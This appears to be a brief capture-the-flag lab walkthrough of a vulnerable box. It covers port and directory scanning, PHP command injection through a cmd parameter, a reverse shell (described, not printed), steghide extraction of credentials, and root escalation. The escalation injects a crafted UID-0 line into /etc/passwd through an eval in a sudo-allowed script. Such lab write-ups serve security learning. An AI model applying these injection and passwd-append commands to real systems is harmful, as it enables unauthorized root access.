1. NMAP scan -p22, p80    
2. FFUF
3. http://10.10.57.52/assets/ -> blank  
4. http://10.10.57.52/assets/index.php
5. ### we have a php vulnerability based on below concept   
6. ![image](https://github.com/user-attachments/assets/7e465e80-e5e8-4eec-a5d1-abc07b31bd21)
7. http://example.com/vuln.php?cmd=ls
8. disable_functions = system, exec, shell_exec, passthru, popen, proc_open  
9. $user = escapeshellarg($_GET['user']);    
10. ### expoliting the vulnerability    
11. http://example.com/vuln.php?cmd=id  
12. we get value in base64    
13. Now, lets enter reversehell and url encode     
14. We got reverse shell as www-data  
15. ![image](https://github.com/user-attachments/assets/ec76b8ce-9b6a-4c49-8709-5657bc7308d4)  
16. In images folder we have oneforall.jp and yuei.jpg  
17. wget http://10.10.57.52/assets/images/yuei.jpg    
18. wget http://10.10.57.52/assets/images/oneforall.jpg  
19. We found Hidden_Content directory which has base64 encode passphrase  
20. There is a user Deku but we are unable to view the user.txt file in the folder
21. file oneforall.jpg is corrupt
22. It has magic bytes of png
23. Lets change to jpg
24. https://en.wikipedia.org/wiki/List_of_file_signatures
25. steghide only supports jpg
26. steghide --extract -sf oneforall.jpg
27. It asks for passphrase
28. Stores it to creds.txt
29. we get password for deku
30. we find user flag
31. sudo -l ->  /opt/NewComponent/feedback.sh
32. mkpasswd -m md5crypt -s
33. Password: 123
34. $1$tbnb4vuW$eI8Md2cXWjeQIUMFAmSvg1  
35. test:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:test:/root:/bin/bash
36. 'test:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:test:/root:/bin/bash' >> /etc/passwd
37. su test
38. We get access as root
39. We get root flag
40. ## root flag exploit
41. In the feedback.sh code there is a line "eval "echo $feedback""
42. it exceutes eval $feedback
43. if we enter abc >> file.txt, it echoes, abc to file.txt
44. so, we create a password on our system and make it in the format user is store in /etc/passwd file
45. Then we echo the same to /etc/passwd
46. as eval() is a system function, it get executed
47. 
  

